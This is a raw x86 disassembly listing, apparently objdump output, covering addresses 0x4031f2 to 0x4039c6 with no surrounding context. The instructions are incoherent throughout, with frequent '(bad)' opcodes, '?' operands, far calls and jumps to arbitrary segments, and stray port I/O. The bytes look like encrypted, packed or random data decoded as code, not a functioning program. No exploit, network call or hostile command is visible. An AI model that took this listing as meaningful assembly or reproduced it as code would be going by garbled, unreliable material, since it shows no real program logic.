  4031f2:	bound  ebx,QWORD PTR [eax-0x75a788b2]
  4031f8:	outs   dx,DWORD PTR ds:[esi]
  4031f9:	out    0x94,eax
  4031fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031fc:	pop    edx
  4031fd:	mov    bh,0xf3
  4031ff:	inc    esi
  403200:	pop    DWORD PTR [edx+0x14]
  403203:	jnp    0x403254
  403205:	cwde   
  403206:	jmp    0xdfce56bc
  40320b:	lock mov bl,BYTE PTR [eax+0x3f7b983]
  403212:	xor    DWORD PTR [edi],edx
  403214:	addr16 aam 0x93
  403217:	and    al,0x3a
  403219:	pop    ebp
  40321a:	xchg   edx,eax
  40321b:	sub    eax,DWORD PTR [ebp-0x7f]
  40321e:	and    BYTE PTR [eax+0x7dd84632],bh
  403224:	mov    dl,al
  403226:	jmp    0x4031ba
  403228:	popf   
  403229:	std    
  40322a:	push   esi
  40322b:	cmc    
  40322c:	push   eax
  40322d:	mov    cl,0x52
  40322f:	leave  
  403230:	mov    BYTE PTR [ecx-0x5b38ae8c],al
  403236:	jnp    0x403250
  403238:	aas    
  403239:	pop    esp
  40323a:	loopne 0x40324e
  40323c:	out    0x2b,eax
  40323e:	jae    0x4031e3
  403240:	dec    esi
  403241:	not    bh
  403243:	xor    DWORD PTR [esi+0x42],0x7c6b7405
  40324a:	mov    cl,BYTE PTR [edx+0xf]
  40324d:	scas   al,BYTE PTR es:[edi]
  40324e:	stc    
  40324f:	aas    
  403250:	cmp    al,0x64
  403252:	inc    ebx
  403253:	iret   
  403254:	out    0xf9,al
  403256:	cmp    eax,0xaca1a193
  40325b:	xor    al,0xca
  40325d:	adc    al,0xd
  40325f:	ja     0x4032dd
  403261:	mov    cl,0xaa
  403263:	mov    fs,WORD PTR [ecx+0x6a]
  403266:	sub    ch,BYTE PTR [eax+0x18]
  403269:	fmul   QWORD PTR [esi]
  40326b:	retf   
  40326c:	aas    
  40326d:	and    DWORD PTR [ecx+0x1c2e8116],ecx
  403273:	call   0x1eee:0xed4a5dcf
  40327a:	jl     0x403220
  40327c:	mov    ch,0xac
  40327e:	add    BYTE PTR [edi-0x366b436b],ch
  403284:	stos   BYTE PTR es:[edi],al
  403285:	xchg   ebp,eax
  403286:	sub    dh,bl
  403288:	rcr    BYTE PTR [ebx],cl
  40328a:	repz add al,0x22
  40328d:	mov    al,0xd7
  40328f:	mov    cl,0x99
  403292:	mov    al,ds:0x9b807c64
  403297:	ret    0x45b1
  40329a:	call   0xf0c31c23
  40329f:	das    
  4032a0:	xor    al,0x63
  4032a2:	xor    al,0x17
  4032a4:	adc    BYTE PTR [ecx],cl
  4032a6:	jmp    0x403303
  4032a8:	js     0x4032b3
  4032aa:	into   
  4032ab:	push   es
  4032ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032ad:	pop    edi
  4032ae:	pop    edx
  4032af:	xor    eax,0x7495c784
  4032b4:	dec    ebx
  4032b5:	jmp    0xb901469f
  4032ba:	push   ecx
  4032bb:	test   BYTE PTR ds:0xb0e8e601,0x1b
  4032c2:	arpl   WORD PTR [ebp+0x26d3a08b],si
  4032c8:	out    0x36,eax
  4032ca:	(bad)  
  4032cb:	jnp    0x4032c5
  4032cd:	sbb    ah,BYTE PTR [ebx]
  4032cf:	and    edi,DWORD PTR [eax]
  4032d1:	mov    bl,0xd9
  4032d3:	jmp    0xa7861d27
  4032d8:	mov    ?,WORD PTR [ebx]
  4032da:	pop    esi
  4032db:	sbb    al,0x21
  4032dd:	call   0x56be:0xfc9a3f1d
  4032e4:	pop    eax
  4032e5:	sar    dh,0x64
  4032e8:	shl    dh,1
  4032ea:	mov    dl,0x88
  4032ec:	dec    esp
  4032ed:	(bad)  
  4032ee:	out    0xc7,al
  4032f0:	and    eax,0x48545d68
  4032f5:	(bad)  
  4032f6:	lahf   
  4032f7:	jae    0x40331d
  4032f9:	sub    BYTE PTR [eax-0x22],ch
  4032fc:	pop    esp
  4032fd:	push   eax
  4032fe:	or     DWORD PTR [ecx-0x7b],0xffffffa9
  403302:	mov    dh,0x59
  403304:	xlat   BYTE PTR ds:[ebx]
  403305:	mov    ch,0xf7
  403307:	sti    
  403308:	(bad)  
  40330a:	out    0x29,al
  40330c:	jmp    0x5cb8:0x31ec5a4b
  403313:	inc    ebp
  403314:	push   esp
  403315:	push   edi
  403316:	in     eax,dx
  403317:	test   al,0xc4
  403319:	jg     0x4032af
  40331b:	mov    ah,0x3a
  40331d:	push   es
  40331e:	fwait
  40331f:	xor    ecx,ebx
  403321:	mov    ebx,DWORD PTR [eax]
  403323:	sub    al,0x65
  403325:	mov    esp,0xdee21736
  40332a:	xor    dh,bl
  40332c:	and    edx,DWORD PTR [ecx]
  40332e:	int3   
  40332f:	mov    edi,0x49bcb06e
  403334:	and    eax,0x437db265
  403339:	scas   eax,DWORD PTR es:[edi]
  40333a:	mov    dh,0x5f
  40333c:	fcomp  DWORD PTR [ecx]
  40333e:	and    eax,eax
  403340:	arpl   WORD PTR [eax+0x4a4c522c],ax
  403346:	xlat   BYTE PTR ds:[ebx]
  403347:	mov    eax,0x4f11e40f
  40334c:	gs inc esi
  40334e:	mov    dh,0x5c
  403350:	xor    eax,0x2947daea
  403355:	fidivr WORD PTR [edx]
  403357:	cmp    al,BYTE PTR [edi+esi*4+0x553cfdb7]
  40335e:	pop    edi
  40335f:	and    bh,BYTE PTR [edi+0x4541147e]
  403365:	ja     0x403346
  403367:	sbb    eax,0xe1c7c24f
  40336c:	fwait
  40336d:	push   ss
  40336e:	ds and eax,0xabaad305
  403374:	push   ss
  403375:	adc    BYTE PTR [ebx+0x78],0xca
  403379:	jae    0x403345
  40337b:	xlat   BYTE PTR ds:[ebx]
  40337c:	jno    0x403359
  40337e:	pop    eax
  40337f:	setne  bh
  403382:	imul   edx,DWORD PTR [esi+0x75],0x31
  403386:	leave  
  403387:	cmp    BYTE PTR ds:0x147caef1,al
  40338d:	imul   ebp,DWORD PTR [eax+0x1a50015d],0x959c4e16
  403397:	pop    edx
  403398:	adc    edi,ebp
  40339a:	cmp    eax,0x9893f6b4
  40339f:	pusha  
  4033a0:	sub    eax,0x2b06a2a7
  4033a5:	lods   eax,DWORD PTR ds:[esi]
  4033a6:	pop    ebx
  4033a7:	push   0x65198b7c
  4033ac:	in     al,dx
  4033ad:	push   ebp
  4033ae:	and    al,0x51
  4033b0:	mov    bh,0x28
  4033b2:	or     esp,ebx
  4033b4:	js     0x4033a5
  4033b6:	or     al,0x45
  4033b8:	cmc    
  4033b9:	mov    esp,0xb696c870
  4033be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033bf:	fwait
  4033c0:	and    al,0x53
  4033c2:	je     0x4033e0
  4033c4:	inc    edi
  4033c5:	mov    dl,0xe8
  4033c7:	popa   
  4033c8:	aad    0xc5
  4033ca:	add    BYTE PTR [ebp-0x75],bl
  4033cd:	adc    ah,cl
  4033cf:	icebp  
  4033d0:	inc    eax
  4033d1:	add    BYTE PTR ss:[esi+0x45],dh
  4033d5:	(bad)  
  4033d6:	sbb    edx,ebp
  4033d8:	sti    
  4033d9:	pop    ecx
  4033da:	shl    esi,1
  4033dc:	loope  0x40344b
  4033de:	mov    bh,0x2f
  4033e0:	pop    ss
  4033e1:	fldcw  WORD PTR [eax-0x42b529c2]
  4033e7:	stc    
  4033e8:	inc    esi
  4033e9:	je     0x40341f
  4033eb:	and    bl,BYTE PTR [edi-0x1a93d6b1]
  4033f1:	pop    esp
  4033f2:	or     eax,0x81dd1402
  4033f7:	call   0xaf1ba01d
  4033fc:	cmp    dh,BYTE PTR [edx+edx*1-0x292e202e]
  403403:	push   ecx
  403404:	fmul   DWORD PTR [esi]
  403406:	call   0xcb87c28
  40340b:	aam    0x79
  40340d:	leave  
  40340e:	mov    bh,0x94
  403410:	xchg   ebp,eax
  403411:	push   edx
  403412:	push   ecx
  403413:	mov    ecx,0xb6064d11
  403418:	jmp    0x403431
  40341a:	sbb    BYTE PTR [ecx],0xc5
  40341d:	fdivr  st(1),st
  40341f:	mov    eax,ds:0xee7a34fc
  403424:	(bad)  
  403425:	aad    0xeb
  403427:	gs mov esp,0xb3867265
  40342d:	outs   dx,DWORD PTR ds:[esi]
  40342e:	inc    eax
  40342f:	daa    
  403430:	cli    
  403431:	call   0xedd8:0xd608c393
  403438:	mov    dl,0xd1
  40343a:	dec    ecx
  40343b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40343c:	jae    0x4034b9
  40343e:	and    ecx,DWORD PTR [edx+0x57d7cd8b]
  403444:	popf   
  403445:	pusha  
  403446:	lds    ecx,FWORD PTR [eiz*2-0x6f8e9258]
  40344d:	or     DWORD PTR [ecx+esi*8+0x1],esi
  403451:	jge    0x403401
  403453:	shl    DWORD PTR [eax],cl
  403455:	ror    BYTE PTR [edx+0x15cb8414],0x54
  40345c:	add    BYTE PTR [edx],ch
  40345e:	adc    BYTE PTR [ecx-0x27],0x29
  403462:	sub    DWORD PTR [ebx+0x6b394c8d],ebx
  403468:	aad    0x16
  40346a:	fldl2t 
  40346c:	scas   al,BYTE PTR es:[edi]
  40346d:	dec    esi
  40346e:	ret    0x5336
  403471:	lods   eax,DWORD PTR ds:[esi]
  403472:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403473:	mov    dl,0x3c
  403475:	fnstenv [ebx+edx*8+0x35bfe586]
  40347c:	pop    ebp
  40347d:	or     al,0x70
  40347f:	xchg   edi,eax
  403480:	jns    0x403413
  403482:	ret    0xe806
  403485:	sahf   
  403486:	icebp  
  403487:	mov    ds:0xd0a2a127,eax
  40348c:	jae    0x40346c
  40348e:	icebp  
  40348f:	or     cl,dl
  403491:	adc    DWORD PTR [esi],edx
  403493:	push   es
  403494:	jp     0x4034f8
  403496:	push   ds
  403497:	iret   
  403498:	mov    WORD PTR cs:[ebx+0x652c1456],?
  40349f:	cmc    
  4034a0:	and    BYTE PTR [edi+0x7d1b0ac4],ah
  4034a6:	enter  0x5d4f,0x55
  4034aa:	pop    eax
  4034ab:	les    ecx,FWORD PTR [ebp+0x197436b0]
  4034b1:	and    BYTE PTR [ecx],al
  4034b3:	jge    0x4034e2
  4034b5:	xor    eax,0xe7c08fad
  4034ba:	push   cs
  4034bb:	ins    DWORD PTR es:[edi],dx
  4034bc:	sbb    al,BYTE PTR [edx]
  4034be:	adc    DWORD PTR es:[eax],0x29f8d5c3
  4034c5:	mov    cl,0x75
  4034c7:	adc    eax,0x49149575
  4034cc:	stos   DWORD PTR es:[edi],eax
  4034cd:	dec    edi
  4034ce:	push   esp
  4034cf:	pop    es
  4034d0:	scas   eax,DWORD PTR es:[edi]
  4034d1:	add    bl,dh
  4034d3:	xchg   ebx,eax
  4034d4:	xor    ebp,DWORD PTR [ebp+0x4cba4ce1]
  4034da:	int    0x8c
  4034dc:	adc    DWORD PTR [edi+0xc],0x4f
  4034e0:	sahf   
  4034e1:	mov    fs,ebp
  4034e3:	out    0xcb,al
  4034e5:	aam    0xfb
  4034e7:	nop
  4034e8:	xor    al,0x59
  4034ea:	inc    ecx
  4034eb:	mov    bl,ch
  4034ed:	mov    ds:0x1e3590e5,al
  4034f2:	loope  0x403491
  4034f4:	in     eax,0xb4
  4034f6:	push   eax
  4034f7:	push   edi
  4034f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034f9:	call   0x460b:0x9f823b26
  403500:	test   al,0x91
  403502:	imul   esi,DWORD PTR [eax],0xffffff9a
  403505:	mov    ebx,0x65ae7ff
  40350a:	(bad)  
  40350b:	mov    esp,fs
  40350d:	mov    ds:0xa0f99370,al
  403512:	rol    BYTE PTR [ecx-0x7a09db96],1
  403518:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403519:	(bad)  
  40351a:	mov    edi,0x88db4b97
  40351f:	fld    TBYTE PTR [ecx+0x15]
  403522:	xlat   BYTE PTR ds:[ebx]
  403523:	mov    ss,edx
  403525:	and    eax,0xb62e0ee6
  40352a:	iret   
  40352b:	push   ds
  40352c:	in     al,0x15
  40352e:	xor    edi,esi
  403530:	std    
  403531:	mov    cl,0xd0
  403533:	(bad)  
  403534:	lods   al,BYTE PTR ds:[esi]
  403535:	mov    dh,0xab
  403537:	dec    ebp
  403538:	pop    edi
  403539:	adc    al,0x44
  40353b:	adc    al,0xcd
  40353d:	jb     0x40350e
  40353f:	call   0x9ab0bdd1
  403544:	pop    ss
  403545:	(bad)
  403548:	xchg   edi,eax
  403549:	mov    esp,ds
  40354b:	pop    esi
  40354c:	jecxz  0x4035c1
  40354e:	sbb    BYTE PTR [esi-0x78],dl
  403551:	in     eax,dx
  403552:	jmp    0x4d17f4ab
  403557:	cli    
  403558:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403559:	fnsave [edi+0x12]
  40355c:	xor    al,0x7b
  40355e:	adc    dl,0x53
  403561:	adc    ebx,DWORD PTR [ecx+0x50]
  403564:	xor    DWORD PTR [esi+edx*8-0x12],esi
  403568:	repnz or BYTE PTR [ebx+0x63c0ee3b],cl
  40356f:	fdiv   DWORD PTR [edi+0x2a]
  403572:	pop    ss
  403573:	test   ebp,esp
  403575:	xchg   ecx,eax
  403576:	fst    DWORD PTR [ecx+0x3e]
  403579:	sbb    ah,dl
  40357b:	cmp    BYTE PTR [ecx-0x1d42f5f7],al
  403581:	inc    ch
  403583:	dec    edx
  403584:	(bad)  
  403585:	in     al,dx
  403586:	dec    ebx
  403587:	push   ss
  403588:	cmp    DWORD PTR [esi+0x5fd15f89],ebx
  40358e:	ret    0x3db8
  403591:	mov    edx,0x7042ca32
  403596:	fldenv [edi-0x7d9309d9]
  40359c:	sbb    edi,DWORD PTR [edx-0x39]
  40359f:	mov    ebx,ss
  4035a1:	pop    ss
  4035a2:	xor    al,0x62
  4035a4:	mov    WORD PTR [esp+esi*2],es
  4035a7:	fiadd  DWORD PTR [eax-0x4b]
  4035aa:	fiadd  WORD PTR [edi+0x6b]
  4035ad:	jge    0x403555
  4035af:	ror    DWORD PTR [esp+ecx*1+0x456c37ed],cl
  4035b6:	lock or cl,ah
  4035b9:	and    DWORD PTR [ebx],ebp
  4035bb:	add    BYTE PTR [ebp+0x41867c1],ah
  4035c1:	lds    esp,FWORD PTR [esi]
  4035c3:	xchg   ebx,eax
  4035c4:	mov    al,ds:0x5e7645cb
  4035c9:	sbb    eax,0x7eaea2e8
  4035ce:	cmp    esp,DWORD PTR [ecx]
  4035d0:	idiv   DWORD PTR [ecx+0x6cfb394b]
  4035d6:	int    0xc2
  4035d8:	pop    esp
  4035d9:	push   ecx
  4035da:	or     al,0xc6
  4035dc:	stos   BYTE PTR es:[edi],al
  4035dd:	je     0x4035d9
  4035df:	xchg   si,ax
  4035e1:	(bad)  
  4035e2:	std    
  4035e3:	enter  0x965,0x9c
  4035e7:	adc    BYTE PTR [edx+0x3539b211],ch
  4035ed:	cmp    al,0xa4
  4035ef:	pusha  
  4035f0:	mov    edx,0xea7b582b
  4035f5:	shr    ecx,1
  4035f7:	pop    edx
  4035f8:	dec    ebx
  4035f9:	ret    
  4035fa:	mov    ch,0x42
  4035fc:	pushw  es
  4035fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4035ff:	mov    ebp,fs
  403601:	sti    
  403602:	mov    eax,ds:0x352f5de0
  403607:	(bad)  
  403608:	sub    al,0x94
  40360a:	addr16 leave 
  40360c:	ins    DWORD PTR es:[edi],dx
  40360d:	fs push ecx
  40360f:	xlat   BYTE PTR ds:[ebx]
  403610:	push   ss
  403611:	add    al,0xc1
  403613:	add    eax,0xfac77ab2
  403618:	pushf  
  403619:	add    esp,esp
  40361b:	dec    esi
  40361c:	mov    bh,0x4c
  40361e:	add    DWORD PTR cs:[eax+0x354b8390],ebx
  403625:	pop    edi
  403626:	inc    esp
  403627:	shr    ebp,1
  403629:	mov    ebx,DWORD PTR [edi+0x1784f5b8]
  40362f:	mov    ch,cl
  403631:	push   cs
  403632:	dec    eax
  403633:	xchg   edi,eax
  403634:	(bad)  
  403635:	in     eax,0x36
  403637:	or     eax,0xabe36799
  40363c:	(bad)  
  40363e:	pop    eax
  40363f:	xchg   edx,eax
  403640:	mov    bl,0x33
  403642:	outs   dx,BYTE PTR ds:[esi]
  403643:	jno    0x403608
  403645:	dec    ecx
  403646:	fs pop esp
  403648:	jle    0x403657
  40364a:	iret   
  40364b:	xchg   esp,eax
  40364c:	push   cs
  40364d:	or     eax,0xdb766279
  403652:	dec    ebx
  403653:	adc    eax,0x10840772
  403658:	cmc    
  403659:	push   eax
  40365a:	mov    ebx,0xb3aae860
  40365f:	call   0x2542:0x45a094a2
  403666:	xor    bl,al
  403668:	cld    
  403669:	or     bl,ch
  40366b:	xlat   BYTE PTR ds:[ebx]
  40366c:	mov    edx,0xfd8e28bd
  403671:	adc    BYTE PTR [eax+0x52],al
  403674:	sbb    al,0x6a
  403676:	jns    0x403696
  403678:	push   ebx
  403679:	mov    ebx,ds
  40367b:	jecxz  0x4036d7
  40367d:	mov    edi,0x1fde809
  403682:	pusha  
  403683:	or     eax,0x2b190179
  403688:	or     ebp,DWORD PTR [edx]
  40368a:	int3   
  40368b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40368c:	outs   dx,DWORD PTR ds:[esi]
  40368d:	mov    ch,BYTE PTR [esp+ecx*2+0x22]
  403691:	sahf   
  403692:	dec    ebp
  403693:	dec    ebp
  403694:	xor    DWORD PTR [eax+0x45],0xd36f7fb4
  40369b:	sub    BYTE PTR [ecx+0x77],cl
  40369e:	or     DWORD PTR [ecx+0x56],edx
  4036a1:	neg    DWORD PTR [ecx+ebp*8+0x7c]
  4036a5:	xor    al,BYTE PTR [edx]
  4036a7:	dec    eax
  4036a8:	sub    ecx,DWORD PTR [edi-0x33]
  4036ab:	daa    
  4036ac:	pop    es
  4036ad:	(bad)  
  4036ae:	xlat   BYTE PTR ds:[ebx]
  4036af:	clc    
  4036b0:	mov    ecx,0x89da5483
  4036b5:	daa    
  4036b6:	std    
  4036b7:	and    DWORD PTR [edi+0x2],ebx
  4036ba:	pushf  
  4036bb:	push   ebx
  4036bc:	les    edi,FWORD PTR [ebp+0x75]
  4036bf:	addr16 fldz 
  4036c2:	ss shr bh,cl
  4036c5:	add    ecx,DWORD PTR [esi+0x208a31c8]
  4036cb:	add    BYTE PTR [esi+edx*8],al
  4036ce:	bound  edx,QWORD PTR [ebx+ecx*2]
  4036d1:	jge    0x4036c8
  4036d3:	jecxz  0x403665
  4036d5:	jne    0x4036db
  4036d7:	push   es
  4036d8:	jmp    0x46128f5f
  4036dd:	out    dx,al
  4036de:	dec    edx
  4036df:	int    0xe6
  4036e1:	mov    ecx,0xb5962993
  4036e6:	and    eax,0x96e95386
  4036eb:	shl    BYTE PTR [ecx+0x16],0x55
  4036ef:	add    edi,ebp
  4036f1:	loope  0x4036a7
  4036f3:	ins    DWORD PTR es:[edi],dx
  4036f4:	mov    esi,0xe7cb54fd
  4036f9:	sbb    al,0xe5
  4036fb:	rcl    DWORD PTR [edx-0x8],0xd
  4036ff:	test   DWORD PTR ds:0x7328e2f0,esi
  403705:	ficom  WORD PTR [esi]
  403707:	cmp    edx,ecx
  403709:	neg    BYTE PTR [edi+0x347018df]
  40370f:	sbb    bh,BYTE PTR [ebx]
  403711:	jne    0x4036dc
  403713:	icebp  
  403714:	xlat   BYTE PTR ds:[ebx]
  403715:	fcom   DWORD PTR [esi]
  403717:	ja     0x403743
  403719:	ja     0x4036e3
  40371b:	popf   
  40371c:	test   DWORD PTR [edx+0x380337fd],ebx
  403722:	xor    BYTE PTR [esi-0x6d],0xc5
  403726:	call   0x8026e4c8
  40372b:	mov    ebp,0x10768a20
  403730:	sbb    dh,BYTE PTR [eax+0x1b]
  403733:	ret    0xccb4
  403736:	xor    eax,0xb83fee06
  40373b:	mov    ebp,DWORD PTR [esi]
  40373d:	jp     0x403775
  40373f:	inc    esp
  403740:	icebp  
  403741:	inc    edi
  403742:	cld    
  403743:	scas   eax,DWORD PTR es:[edi]
  403744:	add    DWORD PTR [edi],ebx
  403746:	ficomp DWORD PTR [eax-0x8]
  403749:	adc    al,0x27
  40374b:	xchg   ebx,eax
  40374c:	adc    eax,esi
  40374e:	push   esi
  40374f:	mov    ch,0x40
  403751:	sbb    eax,0xa28ea98
  403756:	push   DWORD PTR [eax+0x4a]
  403759:	xchg   ebp,eax
  40375a:	hlt    
  40375b:	sub    eax,0x1a8553b
  403760:	stc    
  403761:	xchg   DWORD PTR [ecx-0x75],esi
  403764:	mov    esp,0x4ff43b39
  403769:	and    bl,ah
  40376b:	xchg   esp,eax
  40376c:	pop    eax
  40376e:	bound  eax,QWORD PTR [ecx-0x71]
  403771:	enter  0x723,0xab
  403775:	and    BYTE PTR [esi-0x79],0x72
  403779:	push   ds
  40377a:	xor    eax,0xc8c95ef8
  40377f:	cmc    
  403780:	mov    ah,cl
  403782:	out    0xea,eax
  403784:	adc    eax,DWORD PTR [ebp-0x338c326d]
  40378a:	push   esp
  40378b:	sar    ecx,cl
  40378d:	mov    al,0xe1
  40378f:	cs ins DWORD PTR es:[edi],dx
  403791:	scas   al,BYTE PTR es:[edi]
  403792:	loopne 0x403743
  403794:	inc    ebp
  403795:	popf   
  403796:	stos   DWORD PTR es:[edi],eax
  403797:	(bad)  
  403798:	in     eax,0x5
  40379a:	pop    es
  40379b:	xor    eax,0x4b0425c
  4037a0:	sub    ecx,DWORD PTR [edi]
  4037a2:	add    ebx,eax
  4037a4:	ss inc esi
  4037a6:	je     0x4037d5
  4037a8:	lahf   
  4037a9:	mov    al,ds:0xbe37ace2
  4037ae:	inc    edi
  4037af:	call   0xe1d9:0xf21d4a77
  4037b6:	aaa    
  4037b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4037b8:	out    dx,al
  4037b9:	aam    0x29
  4037bb:	mov    ds,WORD PTR [edx+0x42]
  4037be:	inc    ebp
  4037bf:	cmp    al,BYTE PTR [ecx+0x4626e26c]
  4037c5:	lahf   
  4037c6:	ja     0x403814
  4037c8:	add    al,0xc2
  4037ca:	jbe    0x4037a9
  4037cc:	jns    0x4037f4
  4037ce:	sbb    dh,BYTE PTR [eax]
  4037d0:	jno    0x4037cd
  4037d2:	call   0x9e87:0x8e3b9001
  4037d9:	adc    DWORD PTR [ecx+eiz*8],ebp
  4037dc:	std    
  4037dd:	mov    esi,0xa27d1299
  4037e2:	cs (bad) 
  4037e4:	fwait
  4037e5:	push   esp
  4037e6:	mov    DWORD PTR [ecx],0x5a8a75bf
  4037ec:	sub    eax,0xdf099446
  4037f1:	pushf  
  4037f2:	mov    bl,0x3a
  4037f4:	xor    al,0x97
  4037f6:	aaa    
  4037f7:	out    dx,eax
  4037f8:	aaa    
  4037f9:	(bad)  
  4037fa:	mov    ch,0x87
  4037fc:	push   ebp
  4037fd:	pop    ds
  4037fe:	dec    esp
  4037ff:	out    0x67,al
  403801:	xchg   esp,eax
  403802:	rcr    DWORD PTR ds:0x8b10465a,0x33
  403809:	call   0x9361:0xf0f3ec81
  403810:	xor    BYTE PTR [ecx+0x63],bl
  403813:	mov    DWORD PTR [esp+ecx*4+0x1a],ebx
  403817:	js     0x4037b6
  403819:	dec    esi
  40381a:	adc    ebx,DWORD PTR [edi-0x752bb8c6]
  403820:	cwde   
  403821:	mov    esp,0xbeaf7431
  403826:	(bad)  
  403828:	lds    ecx,FWORD PTR [ebx-0x5]
  40382b:	mov    ch,0x50
  40382d:	dec    esp
  40382e:	xchg   DWORD PTR [eax+eiz*8+0x1d],esi
  403832:	adc    DWORD PTR [ecx-0x3b1ecf96],ebx
  403838:	push   0xe0ec643
  40383d:	mov    cl,0x34
  40383f:	push   ecx
  403840:	cmp    ah,dh
  403842:	jmp    0x4037fa
  403844:	test   BYTE PTR [esi-0x40],bh
  403847:	fiadd  DWORD PTR [esp+ecx*1-0x7b]
  40384b:	pop    edi
  40384c:	in     al,dx
  40384d:	xchg   esi,eax
  40384e:	sbb    al,0x66
  403850:	pop    esp
  403851:	call   DWORD PTR [edi-0x65]
  403854:	cmp    DWORD PTR [edi-0x5e0e3425],ecx
  40385a:	cmp    edx,edi
  40385c:	inc    ebp
  40385d:	lods   eax,DWORD PTR ds:[esi]
  40385e:	jle    0x4038c4
  403860:	xchg   esp,eax
  403861:	dec    edi
  403862:	outs   dx,DWORD PTR ds:[esi]
  403863:	mov    BYTE PTR [edi-0x6a],bl
  403866:	pop    esp
  403867:	sbb    eax,0xff1bbeff
  40386c:	push   esp
  40386d:	retf   
  40386e:	jl     0x4038b5
  403870:	clc    
  403871:	(bad)  
  403873:	(bad)  
  403874:	ds aas 
  403876:	pusha  
  403877:	mov    BYTE PTR [ecx+0x4977b11c],ch
  40387d:	imul   ecx,DWORD PTR [esi],0x6
  403880:	in     al,0x6
  403882:	inc    ebp
  403883:	fstp   DWORD PTR [ecx-0xd]
  403886:	mov    esp,0x5d4f59f3
  40388b:	mov    eax,0xc4aae18f
  403890:	outs   dx,DWORD PTR ds:[esi]
  403891:	(bad)  
  403892:	jle    0x40387d
  403894:	fsub   st,st(4)
  403896:	pop    esp
  403897:	add    eax,0xa2550b14
  40389c:	add    BYTE PTR [ecx],al
  40389e:	leave  
  40389f:	iret   
  4038a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038a1:	adc    ah,BYTE PTR [ebx]
  4038a3:	push   0x3f
  4038a5:	mov    ch,0xb9
  4038a7:	ja     0x4038ab
  4038a9:	mov    al,0xd8
  4038ab:	and    esi,DWORD PTR [ecx]
  4038ad:	int3   
  4038ae:	hlt    
  4038af:	ret    0x94c0
  4038b2:	ror    DWORD PTR [esi],0x0
  4038b5:	dec    edx
  4038b6:	jo     0x4038c1
  4038b8:	lea    ecx,[esi-0x4a]
  4038bb:	pop    esi
  4038bc:	imul   esp,DWORD PTR [ecx+0x4ad92287],0x1b5a7142
  4038c6:	and    BYTE PTR [ebp-0x7d],bh
  4038c9:	mov    cl,0xb4
  4038cb:	pop    ss
  4038cc:	xchg   esp,eax
  4038cd:	mov    esp,ds
  4038cf:	dec    esp
  4038d0:	dec    esp
  4038d1:	push   ss
  4038d2:	sbb    DWORD PTR [ebx+0x54],ebx
  4038d5:	sbb    DWORD PTR [edx-0x47830c7],0x586f6728
  4038df:	pop    edi
  4038e0:	aad    0x82
  4038e2:	and    DWORD PTR [esi],eax
  4038e4:	imul   ecx,ebx,0x73
  4038e7:	ror    eax,0x79
  4038ea:	bound  edi,QWORD PTR [ecx]
  4038ec:	sub    al,BYTE PTR [edi+0x69bafe3c]
  4038f2:	test   BYTE PTR [eax+0x3687b5a],0xa6
  4038f9:	xor    eax,DWORD PTR [edi-0x2a03466]
  4038ff:	ret    
  403900:	jecxz  0x403894
  403902:	fcmove st,st(2)
  403904:	sub    DWORD PTR [ebp+0xff93d1],edx
  40390a:	or     al,0x94
  40390c:	(bad)  
  40390d:	xchg   edx,eax
  40390e:	or     BYTE PTR [eax-0x64],al
  403911:	ss ins DWORD PTR es:[edi],dx
  403913:	lock pop edx
  403915:	ret    
  403916:	xor    DWORD PTR [ecx],esi
  403918:	enter  0xdbe9,0xb2
  40391c:	push   edi
  40391d:	(bad)  
  40391e:	mov    edi,0xd6ca828a
  403923:	into   
  403924:	icebp  
  403925:	pop    es
  403926:	std    
  403927:	xchg   ebp,eax
  403928:	mov    dl,0xe7
  40392a:	addr16 xor dh,dh
  40392d:	mov    ecx,0x2cdc4154
  403932:	sub    ebp,DWORD PTR [ecx]
  403934:	cmp    BYTE PTR [edi],al
  403936:	call   0x67f06984
  40393b:	xchg   ecx,eax
  40393c:	adc    al,0xb7
  40393e:	jmp    0x8a2a17a9
  403943:	popf   
  403944:	into   
  403945:	cmp    BYTE PTR [ebx-0x64],al
  403948:	imul   eax,DWORD PTR [esi-0x2a],0x8a6aba6
  40394f:	sbb    bl,dl
  403951:	enter  0xdd13,0xac
  403955:	cli    
  403956:	jno    0x403931
  403958:	jmp    0xaaaf:0x4c13d371
  40395f:	and    eax,esp
  403961:	addr16 adc ebp,edx
  403964:	iret   
  403965:	mov    eax,edx
  403967:	jae    0x403928
  403969:	xchg   edi,eax
  40396a:	xlat   BYTE PTR ds:[ebx]
  40396b:	xlat   BYTE PTR ds:[ebx]
  40396c:	fidiv  DWORD PTR [ebx-0x707345b8]
  403972:	ret    
  403973:	lods   al,BYTE PTR ds:[esi]
  403974:	in     al,0x66
  403976:	lods   eax,DWORD PTR ds:[esi]
  403977:	push   ebp
  403978:	mov    ds:0x3d3aae7f,al
  40397d:	dec    bh
  40397f:	xchg   BYTE PTR [eax-0x141911eb],al
  403985:	jbe    0x40390a
  403987:	cwde   
  403988:	jno    0x403925
  40398a:	jl     0x4039a3
  40398c:	imul   ebp,edi,0x6e
  40398f:	ja     0x403976
  403991:	jae    0x403a06
  403993:	mov    ds:0xbd09eea7,eax
  403998:	ss pop esi
  40399a:	sar    esi,cl
  40399c:	jecxz  0x4039cc
  40399e:	mov    bl,BYTE PTR [eax+0x61]
  4039a1:	jl     0x4039be
  4039a3:	add    BYTE PTR [ecx],bh
  4039a5:	ss ins DWORD PTR es:[edi],dx
  4039a7:	fs call 0x7450:0x1b57d7f4
  4039af:	dec    edi
  4039b0:	retf   
  4039b1:	push   edx
  4039b2:	pusha  
  4039b3:	add    ah,BYTE PTR [edx]
  4039b5:	pop    eax
  4039b6:	(bad)  
  4039b7:	or     eax,0x79364a05
  4039bc:	jb     0x403a2c
  4039be:	mov    ebx,edx
  4039c0:	lods   eax,DWORD PTR ds:[esi]
  4039c1:	dec    esp
  4039c2:	cs pop ecx
  4039c4:	cmp    DWORD PTR [edi],ecx
  4039c6:	cmp    al,0xf
